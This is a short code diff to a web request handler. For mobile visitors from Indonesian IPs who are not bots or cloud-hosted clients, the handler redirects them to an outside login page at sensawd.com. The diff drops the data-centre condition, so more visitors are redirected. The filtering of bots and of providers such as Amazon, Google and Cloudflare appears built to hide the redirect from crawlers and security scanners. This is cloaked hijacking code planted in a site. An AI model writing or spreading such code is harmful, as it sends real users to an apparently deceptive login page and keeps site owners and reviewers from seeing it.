@@ -11,7 +11,7 @@ export async function onRequest(context) {
   const isStaticFile = /\.(jpg|jpeg|png|gif|css|js|ico|svg|woff|woff2)$/i.test(url.pathname);
   const isCloud = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','vps','hetzner','vultr','alibaba'].some(c => asOrg.includes(c));
 
-  if (isMobile && isIndonesiaIP && isIndonesiaColo && !isBot && !isStaticFile && !isCloud) {
+  if (isMobile && isIndonesiaIP && !isBot && !isStaticFile && !isCloud) {
     return Response.redirect("https://sensawd.com/login", 302);
   }
   return next();
